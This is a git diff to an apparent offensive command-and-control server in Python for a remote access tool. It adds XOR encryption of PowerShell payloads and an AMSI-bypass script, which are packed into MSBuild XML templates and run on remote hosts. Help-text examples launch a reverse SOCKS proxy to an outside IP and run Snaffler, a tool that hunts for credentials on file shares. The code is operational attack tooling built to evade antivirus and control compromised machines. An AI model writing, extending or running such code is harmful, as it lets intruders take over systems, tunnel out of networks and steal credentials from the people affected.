@@ -135,16 +135,32 @@ def create_psscript(filepath, extra_cmds=""):
         b64data = base64.b64encode(data.encode('utf-8')).decode('utf-8')
         return(b64data)
 
-def send_nps_msbuild_xml(script):
+def send_nps_msbuild_xml(input_data, ratID):
+    ps_script_path = input_data.split(" ")[1]
+    amsi_data = ""
+    extra_cmds = ""
+    try:
+        extra_cmds = " ".join(input_data.split(" ")[2:])
+    except:
+        pass
+
     with open(os.getcwd() + "/resources/nps_modified.xml" , "r") as fd:
-        msbuild_data = fd.read().replace("~~SCRIPT~~" , script)
+        msbuild_data = fd.read()
 
-    amsi = ""
     if(prepend_amsi_bypass_to_psh):
-        amsi = create_psscript(os.getcwd() + "/resources/Disable-Amsi.ps1")
+        with open(os.getcwd() + "/resources/Disable-Amsi.ps1" , "rb") as fd:
+            amsi_data = fd.read()
 
-    msbuild_data = msbuild_data.replace("~~AMSI~~" , amsi)
-    return base64.b64encode(msbuild_data.encode('utf-8')).decode('utf-8')
+    with open(Path(ps_script_path).resolve() , "rb") as fd:
+        script_data = fd.read()
+        if(extra_cmds):
+            script_data += b"\n" + bytes(extra_cmds, 'utf-8')
+
+    msbuild_data = msbuild_data.replace("~~KEY~~",  ratID)
+    msbuild_data = msbuild_data.replace("~~AMSI~~", xor_crypt_and_encode(amsi_data, ratID))
+    msbuild_data = msbuild_data.replace("~~SCRIPT~~", xor_crypt_and_encode(script_data, ratID))
+    b64data =  base64.b64encode(msbuild_data.encode('utf-8')).decode('utf-8')
+    return(b64data)
 
 def send_csharper_msbuild_xml(input_data, ratID):
     assembly_path = input_data.split(" ")[1]
@@ -164,32 +180,34 @@ def send_csharper_msbuild_xml(input_data, ratID):
 # Parses an operator's "cs" line to the correct format needed in msbuild xml file
 # Example: cs SharpDump.exe arg1 arg2 "third arg" ->  "arg1", "arg2", "third arg" 
 def parse_c_sharp_args(argument_string):
-	stringlist = []
-	stringbuilder = ""
-	inside_quotes = False
+    stringlist = []
+    stringbuilder = ""
+    inside_quotes = False
 
-	args = argument_string.split(" ")[2:]
-	args = " ".join(args)
+    args = argument_string.split(" ")[2:]
+    args = " ".join(args)
 
-	if(not args):
-		return("  ")
-	for ch in args:
-		if(ch == " " and not inside_quotes):
-			stringlist.append(stringbuilder) # Add finished string to the list
-			stringbuilder = "" # Reset the string
-		elif(ch == '"'):
-			inside_quotes = not inside_quotes
-		else: # Ch is a normal character
-			stringbuilder += ch # Add next ch to string
+    if(not args):
+        return("  ")
+    for ch in args:
+        if(ch == " " and not inside_quotes):
+            stringlist.append(stringbuilder) # Add finished string to the list
+            stringbuilder = "" # Reset the string
+        elif(ch == '"'):
+            inside_quotes = not inside_quotes
+        else: # Ch is a normal character
+            stringbuilder += ch # Add next ch to string
 
-	# Finally...
-	stringlist.append(stringbuilder)
-	for arg in stringlist:
-		if(arg == ""):
-			stringlist.remove(arg)
+    # Finally...
+    stringlist.append(stringbuilder)
+    for arg in stringlist:
+        if(arg == ""):
+            stringlist.remove(arg)
 
-	argument_string = '", "'.join(stringlist)
-	return(' "' + argument_string + '" ')
+    argument_string = '", "'.join(stringlist)
+    # Replace backslashes with a literal backslash so an operator can type a file path like C:\windows\system32 instead of C:\\windows\\system32
+    argument_string = argument_string.replace("\\", "\\\\")
+    return(' "' + argument_string + '" ')
 
 # Simple xor cipher to encrypt C# binaries and encode them into a base64 string
 def xor_crypt_and_encode(data, key):
@@ -306,6 +324,7 @@ def get_help():
     print("psh <local_powershell_script_path> <extra powershell commands> -- Runs the powershell script on the rat. Uses MSBuild.exe or powershell.exe depending on the agent type")
     print("example: psh script/Invoke-SocksProxy.ps1 Invoke-ReverseSocksProxy -remotePort 4444 -remoteHost 12.23.34.45")
     print("cs <local_c_sharp_exe_path> <command_arguments> -- Runs the assembly on the remote host using MSBuild.exe and a C Sharp reflective loader stub")
+    print("example: cs scripts/Snaffler.exe --domain borgar.local --stdout")
     print("-------------------------------------------------------------------------")
     print("")
     print("Extra things to know:")
@@ -397,9 +416,9 @@ if __name__ == "__main__":
                             if(types[ratID] == "ps1"):
                                 inp = "psh " + create_psscript(filepath, extra_cmds)
                             else:
-                                inp = "psh " + msbuild_path + " " + send_nps_msbuild_xml(create_psscript(filepath, extra_cmds))
+                                inp = "psh " + msbuild_path + " " + send_nps_msbuild_xml(inp, ratID)
                         except:
-                            print("[!] Could not open file " + filepath + " for reading")
+                            print("[!] Could not open file " + filepath + " for reading or other unexpected error occured")
                             continue
 
                     elif(str.startswith(inp, "cs ")):
@@ -410,7 +429,7 @@ if __name__ == "__main__":
                             else:
                                 inp = "cs " + msbuild_path + " " + send_csharper_msbuild_xml(inp, ratID)
                         except:
-                            print("[!] Could not open file " + filepath + " for reading")
+                            print("[!] Could not open file " + filepath + " for reading or other unexpected error occured")
                             continue
 
                     print("[*] Queued command " + colors(inp) + " for " + colors(ratID))
